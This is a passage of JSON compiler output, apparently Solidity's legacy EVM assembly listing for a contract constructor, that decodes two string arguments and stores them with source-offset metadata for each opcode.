									"source": -1,
									"value": "40"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 19,
									"end": 30,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 14,
									"end": 17,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 11,
									"end": 31,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "3"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 44,
									"end": 45,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 41,
									"end": 42,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 34,
									"end": 46,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "tag",
									"source": -1,
									"value": "3"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 66,
									"end": 69,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 62,
									"end": 83,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "SWAP2",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 123,
									"end": 127,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 118,
									"end": 121,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 114,
									"end": 128,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 159,
									"end": 168,
									"name": "DUP6",
									"source": -1
								},
								{
									"begin": 141,
									"end": 157,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 138,
									"end": 169,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "4"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 182,
									"end": 183,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 179,
									"end": 180,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 172,
									"end": 184,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "tag",
									"source": -1,
									"value": "4"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 219,
									"end": 222,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 213,
									"end": 223,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 330,
									"end": 339,
									"name": "DUP7",
									"source": -1
								},
								{
									"begin": 325,
									"end": 326,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 311,
									"end": 323,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 307,
									"end": 327,
									"name": "MUL",
									"source": -1
								},
								{
									"begin": 289,
									"end": 305,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 285,
									"end": 328,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 282,
									"end": 340,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 261,
									"end": 272,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 247,
									"end": 259,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 244,
									"end": 273,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 233,
									"end": 348,
									"name": "OR",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 361,
									"end": 362,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 358,
									"end": 359,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 351,
									"end": 363,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "tag",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 384,
									"end": 396,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 379,
									"end": 382,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 372,
									"end": 397,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 420,
									"end": 424,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 415,
									"end": 418,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 411,
									"end": 425,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "SWAP3",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 23,
									"end": 24,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "6"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 33,
									"end": 36,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 30,
									"end": 31,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 27,
									"end": 37,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 99,
									"end": 100,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 94,
									"end": 97,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 90,
									"end": 101,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 84,
									"end": 102,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 80,
									"end": 81,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 75,
									"end": 78,
									"name": "DUP5",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 64,
									"end": 103,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 52,
									"end": 54,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 49,
									"end": 50,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 45,
									"end": 55,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "SWAP1",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "6"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 12,
									"end": 26,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "tag",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 19,
									"end": 30,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 14,
									"end": 17,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 11,
									"end": 31,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "10"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 44,
									"end": 45,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 41,
									"end": 42,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 34,
									"end": 46,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "tag",
									"source": -1,
									"value": "10"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 66,
									"end": 69,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 62,
									"end": 83,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "SWAP2",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 123,
									"end": 127,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 118,
									"end": 121,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 114,
									"end": 128,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 159,
									"end": 168,
									"name": "DUP6",
									"source": -1
								},
								{
									"begin": 141,
									"end": 157,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 138,
									"end": 169,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "11"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 182,
									"end": 183,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 179,
									"end": 180,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 172,
									"end": 184,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "tag",
									"source": -1,
									"value": "11"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 219,
									"end": 222,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 213,
									"end": 223,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 330,
									"end": 339,
									"name": "DUP7",
									"source": -1
								},
								{
									"begin": 325,
									"end": 326,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 311,
									"end": 323,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 307,
									"end": 327,
									"name": "MUL",
									"source": -1
								},
								{
									"begin": 289,
									"end": 305,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 285,
									"end": 328,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 282,
									"end": 340,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 261,
									"end": 272,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 247,
									"end": 259,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 244,
									"end": 273,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 233,
									"end": 348,
									"name": "OR",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "12"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 361,
									"end": 362,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 358,
									"end": 359,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 351,
									"end": 363,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "tag",
									"source": -1,
									"value": "12"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 384,
									"end": 396,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 379,
									"end": 382,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 372,
									"end": 397,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 420,
									"end": 424,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 415,
									"end": 418,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 411,
									"end": 425,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "SWAP3",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 23,
									"end": 24,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "13"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 33,
									"end": 36,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 30,
									"end": 31,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 27,
									"end": 37,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "15"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 99,
									"end": 100,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 94,
									"end": 97,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 90,
									"end": 101,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 84,
									"end": 102,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 80,
									"end": 81,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 75,
									"end": 78,
									"name": "DUP5",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 64,
									"end": 103,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 52,
									"end": 54,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 49,
									"end": 50,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 45,
									"end": 55,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "SWAP1",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "13"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "15"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 12,
									"end": 26,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "16"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "tag",
									"source": 0,
									"value": "16"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 679,
									"end": 689,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 667,
									"end": 676,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 667,
									"end": 689,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 667,
									"end": 689,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "19"
								},
								{
									"begin": 667,
									"end": 689,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 667,
									"end": 689,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 667,
									"end": 689,
									"name": "tag",
									"source": 0,
									"value": "19"
								},
								{
									"begin": 667,
									"end": 689,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 667,
									"end": 689,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 714,
									"end": 726,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 700,
									"end": 711,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 700,
									"end": 726,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 700,
									"end": 726,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "21"
								},
								{
									"begin": 700,
									"end": 726,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 700,
									"end": 726,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 700,
									"end": 726,
									"name": "tag",
									"source": 0,
									"value": "21"
								},
								{
									"begin": 700,
